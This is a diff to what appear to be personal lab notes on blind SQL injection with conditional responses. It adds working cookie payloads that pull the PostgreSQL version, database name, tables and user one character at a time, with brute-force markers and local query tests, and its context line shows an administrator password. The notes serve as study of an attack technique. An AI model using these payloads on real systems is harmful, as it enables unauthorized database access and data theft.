@@ -146,6 +146,7 @@ administrator:7qpk90futuka5actprm7
 ```
 
 ## blind
+### conditional responses
 ```
 # first thing to note (man ascii, printable chars, DEC values):
 special chars:    32 - 47
@@ -164,17 +165,91 @@ TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='2 <<-- 5035 bytes
 # TRUE: "Welcome back" in response 
 # FALSE: "Welcome back" not in response
 
-TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'A'),1,1))=65+AND+'1'='1 <<-- true
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=65+AND+'1'='1 <<-- true
 
-TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'B'),1,1))=66+AND+'1'='1 <<-- true
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'B'),1,1))=66+AND+'1'='1 <<-- true
 
-TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'A'),1,1))=66+AND+'1'='1 <<-- false <<-- we got em
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=66+AND+'1'='1 <<-- false <<-- we got em
 
 # prep for version()
 
-TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+version()),1,1))=66+AND+'1'='1
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=66+AND+'1'='1
 
 # target "66"
+
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=§66§+AND+'1'='1
+
+# use ascii-printable.txt
+
+# increase POS (2,3,4,...)
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),POS,1))=§66§+AND+'1'='1
+
+80   P
+111  o
+115  s
+116  t
+103  g
+
+# ok postgres, now database (note: no need "from pg_database")
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+current_database()),1,1))=97+AND+'1'='1
+
+97   a
+99   c
+97   a
+100  d
+101  e
+109  m
+121  y
+95   _
+108  l
+97   a
+98   b
+115  s
+
+# improvement: no need tail "AND 1=1", just comment and cut short
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=80--
+
+# tables
+table_name from information_schema.tables
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(table_name,':')+from+information_schema.tables),1,1))=97--
+
+# troubleshooting
+# this one ok
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(version(),':')),1,1))=§97§--
+
+# user
+TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+user),1,1))=§80§--
+
+112
+
+# troubleshooting
+# this one didn't
+TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users)='a
+
+# this one works (key: LIMIT 1)
+TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users+LIMIT+1)='a
+
+# try back <<-- failed
+
+# postgresql testing (https://extendsclass.com/postgresql-online.html)
+
+# all rows (note: 'or')
+select firstname from scientist where firstname = 'albert' or ascii(substring((select 'a'),1,1))=97;
+
+# one row (note: 'and')
+select firstname from scientist where firstname = 'albert' and ascii(substring((select 'a'),1,1))=97;
+
+# no result ('and', and intentionally wrong)
+select firstname from scientist where firstname = 'albert' and ascii(substring((select 'b'),1,1))=97;
+
+# testing
+select tablename from pg_catalog.pg_tables; <<-- works
+
+select string_agg(tablename,':') from pg_catalog.pg_tables <<-- works
+
+select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=115; <<-- works
+
+select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=116; <<-- no result (deliberate)
 
 
 ```
